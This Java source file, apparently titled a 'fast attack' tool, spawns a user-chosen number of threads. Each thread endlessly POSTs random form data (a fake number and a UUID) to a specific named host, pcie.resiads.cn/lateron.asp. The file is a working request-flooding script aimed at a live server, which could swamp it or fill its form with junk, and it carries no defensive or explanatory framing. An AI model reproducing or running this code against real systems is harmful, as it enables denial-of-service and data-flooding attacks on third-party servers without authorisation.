package com.netexplore.fastattackbycode;

import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.io.UnsupportedEncodingException;
import java.util.ArrayList;
import java.util.List;
import java.util.Random;
import java.util.UUID;

import org.apache.http.HttpResponse;
import org.apache.http.NameValuePair;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.HttpClientBuilder;
import org.apache.http.message.BasicNameValuePair;

/**
 * @author Silence_Lurker
 */
public class FastBoot {
    public static void main(String[] args) throws UnsupportedEncodingException {
        int time = Integer.parseInt(args[0]);
        for (int i = 0; i < time; i++) {
            new Thread(() -> {
                while (true) {
                    HttpClientBuilder httpClientBuilder = HttpClientBuilder.create();
                    HttpClient httpClient = httpClientBuilder.build();

                    List<NameValuePair> list = new ArrayList<>();

                    Random random = new Random(System.currentTimeMillis());

                    list.add(new BasicNameValuePair("t5", random.nextInt(10000000) + "90000000"));
                    list.add(new BasicNameValuePair("t3", UUID.randomUUID().toString()));

                    HttpPost httpPost = new HttpPost("http://pcie.resiads.cn/lateron.asp");
                    try {
                        httpPost.setEntity(new UrlEncodedFormEntity(list));
                    } catch (UnsupportedEncodingException e1) {
                        e1.printStackTrace();
                    }

                    try {
                        HttpResponse response = httpClient.execute(httpPost);
                        System.out.println(response.getStatusLine().toString());
                    } catch (IOException e) {
                        File file = new File("./", "error.log");
                        if (!file.exists()) {
                            try {
                                file.createNewFile();
                            } catch (IOException e1) {
                                e1.printStackTrace();
                            }
                        }
                        FileWriter writer = null;
                        try {
                            writer = new FileWriter(file);
                            writer.append("Broke one time\r\n");
                            writer.close();
                        } catch (IOException e1) {
                            e1.printStackTrace();
                        }
                    }
                    System.gc();
                }
            }).start();
            ;
        }
    }
}
